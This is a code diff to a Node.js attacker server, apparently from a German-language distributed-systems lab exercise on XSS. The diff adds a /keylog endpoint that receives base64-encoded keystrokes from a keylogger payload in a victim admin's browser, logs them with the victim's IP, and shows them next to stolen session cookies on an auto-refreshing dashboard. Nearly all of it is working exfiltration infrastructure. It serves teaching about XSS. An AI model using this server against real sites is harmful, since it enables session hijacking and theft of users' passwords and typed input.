@@ -24,10 +24,13 @@ function requireAuth(req, res, next) {
 }
 
 const STOLEN_COOKIES_FILE = path.join(__dirname, 'stolen_cookies.txt');
+const KEYLOG_FILE = path.join(__dirname, 'keylog.txt');
 
-// Ensure the file exists
 if (!fs.existsSync(STOLEN_COOKIES_FILE)) {
   fs.writeFileSync(STOLEN_COOKIES_FILE, '=== Gestohlene Cookies – Labor 8 Angreifer-Server ===\n\n');
+}
+if (!fs.existsSync(KEYLOG_FILE)) {
+  fs.writeFileSync(KEYLOG_FILE, '=== Keylogger – Labor 8 Angreifer-Server ===\n\n');
 }
 
 // -------------------------------------------------------
@@ -79,50 +82,74 @@ app.get('/steal', (req, res) => {
 });
 
 // -------------------------------------------------------
+// GET /keylog?k=<value>
+// Empfängt Tastatureingaben vom Keylogger-Payload im Admin-Browser.
+// -------------------------------------------------------
+app.get('/keylog', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+
+  const rawKey   = req.query.k || '';
+  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unbekannt';
+  const timestamp = new Date().toLocaleString('de-CH');
+
+  let decoded = rawKey;
+  try {
+    const buf = Buffer.from(rawKey, 'base64');
+    if (/^[\x20-\x7E\n\r\t]+$/.test(buf.toString('utf8'))) {
+      decoded = buf.toString('utf8');
+    }
+  } catch (_) {}
+
+  const logEntry = `[${timestamp}] IP: ${clientIP} | "${decoded}"\n`;
+  console.log('[ANGREIFER] KEYLOG:', decoded);
+  fs.appendFileSync(KEYLOG_FILE, logEntry);
+
+  const transparentGif = Buffer.from(
+    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
+    'base64'
+  );
+  res.writeHead(200, { 'Content-Type': 'image/gif' });
+  res.end(transparentGif);
+});
+
+// -------------------------------------------------------
 // GET / – simple dashboard showing all stolen cookies
 // -------------------------------------------------------
 app.get('/', requireAuth, (req, res) => {
-  let fileContent = '';
-  try {
-    fileContent = fs.readFileSync(STOLEN_COOKIES_FILE, 'utf8');
-  } catch (_) {
-    fileContent = '(keine Datei vorhanden)';
-  }
+  let cookieContent = '';
+  let keylogContent = '';
+  try { cookieContent = fs.readFileSync(STOLEN_COOKIES_FILE, 'utf8'); } catch (_) {}
+  try { keylogContent = fs.readFileSync(KEYLOG_FILE, 'utf8'); } catch (_) {}
 
-  // Escape HTML for safe display in the dashboard
-  const escaped = fileContent
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
+  const esc = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
   res.send(`
 <!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="5">
-  <title>Angreifer-Server – Gestohlene Cookies</title>
+  <meta http-equiv="refresh" content="3">
+  <title>Angreifer-Server – Labor 8</title>
   <style>
-    body { font-family: monospace; max-width: 900px; margin: 40px auto; padding: 0 20px; background: #1a1a2e; color: #eee; }
+    body { font-family: monospace; max-width: 960px; margin: 40px auto; padding: 0 20px; background: #1a1a2e; color: #eee; }
     h1 { color: #e94560; }
+    h2 { color: #e94560; margin-top: 32px; }
     .subtitle { color: #aaa; font-size: 0.9em; margin-top: -10px; }
     pre { background: #16213e; border: 1px solid #e94560; padding: 20px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; line-height: 1.6; }
     .info { background: #0f3460; border: 1px solid #533483; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 0.85em; }
-    .refresh { color: #888; font-size: 0.8em; }
   </style>
 </head>
 <body>
   <h1>Angreifer-Server</h1>
-  <p class="subtitle">Labor 8 – Verteilte Systeme | XSS Cookie-Theft Demo</p>
+  <p class="subtitle">Labor 8 – Verteilte Systeme | XSS Demo &nbsp;|&nbsp; Auto-Refresh alle 3s</p>
 
-  <div class="info">
-    Wartet auf eingehende Cookies via <code>GET /steal?cookie=&lt;wert&gt;</code><br>
-    Seite wird automatisch alle 5 Sekunden aktualisiert.
-    <span class="refresh">(Auto-Refresh aktiv)</span>
-  </div>
+  <h2>🍪 Gestohlene Cookies &nbsp;<small style="color:#aaa;font-size:0.7em;">/steal</small></h2>
+  <div class="info">XSS-Payload sendet Session-Cookie des Opfers hierher.</div>
+  <pre>${esc(cookieContent) || '(noch keine Cookies empfangen)'}</pre>
 
-  <h2>Protokoll (${STOLEN_COOKIES_FILE})</h2>
-  <pre>${escaped || '(noch keine Cookies empfangen)'}</pre>
+  <h2>⌨️ Keylogger &nbsp;<small style="color:#aaa;font-size:0.7em;">/keylog</small></h2>
+  <div class="info">Keylogger läuft im Admin-Browser – Eingaben werden hier geloggt.</div>
+  <pre>${esc(keylogContent) || '(noch keine Tastatureingaben empfangen)'}</pre>
 </body>
 </html>
   `);
@@ -133,6 +160,7 @@ app.get('/', requireAuth, (req, res) => {
 // -------------------------------------------------------
 app.get('/clear', requireAuth, (req, res) => {
   fs.writeFileSync(STOLEN_COOKIES_FILE, '=== Gestohlene Cookies – Labor 8 Angreifer-Server ===\n\n');
+  fs.writeFileSync(KEYLOG_FILE, '=== Keylogger – Labor 8 Angreifer-Server ===\n\n');
   console.log('[ANGREIFER] Protokoll gelöscht.');
   res.redirect('/');
 });
